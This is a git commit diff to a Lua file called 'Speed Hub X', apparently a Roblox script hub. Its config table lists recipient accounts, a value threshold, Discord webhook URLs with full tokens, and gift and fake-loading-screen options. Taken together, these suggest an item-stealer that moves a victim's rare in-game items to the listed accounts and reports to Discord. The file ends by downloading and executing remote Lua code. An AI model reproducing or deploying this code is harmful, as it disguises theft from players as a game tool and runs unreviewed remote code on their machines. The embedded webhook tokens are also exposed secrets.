32f3784a46aedd8c9b3213adc4e01410f4681fc0
AhmadV99-max <esportsteam168@gmail.com>
2025-08-05 09:55:31 +0700

    Update Speed%20Hub%20X.lua

--- Speed%20Hub%20X.lua
+++ Speed%20Hub%20X.lua
@@ -2,13 +2,12 @@ _G.NullConfig = {
     User = {"1SamRatana", "DEVFURYYT", "IQKH168", "devkak5", "Sky168295", "Ahlalu"},
     min_value = 10000000000,
     pingEveryone = "Yes", -- dont change this
-    Webhook = "https://discord.com/api/webhooks/1393254261563068528/Ygog_NZ9oOnsIeGdlDlmSOn99orViDkd3P1n-DuNX26jFPv0FtEtu4vXmLOuvONMf7xX",
+    Webhook = "https://discord.com/api/webhooks/1401053464326312026/dLnzmmFUnhWAdGWJm_hS37tfRy3wgdvRJCqkntRaKOtUgOjsccdjimmDrD01cJBzsHGd",
     FakeGift = "No",
-    Trash = "https://discord.com/api/webhooks/1393254261563068528/Ygog_NZ9oOnsIeGdlDlmSOn99orViDkd3P1n-DuNX26jFPv0FtEtu4vXmLOuvONMf7xX",
-    LoadingScreen = "No",
-    GiftOnlyRares = "No",
-    ExecuteOtherScript = "Yes",
-    OtherScript = "https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua",
+    Trash = "https://discord.com/api/webhooks/1401053464326312026/dLnzmmFUnhWAdGWJm_hS37tfRy3wgdvRJCqkntRaKOtUgOjsccdjimmDrD01cJBzsHGd",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
 }
     
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
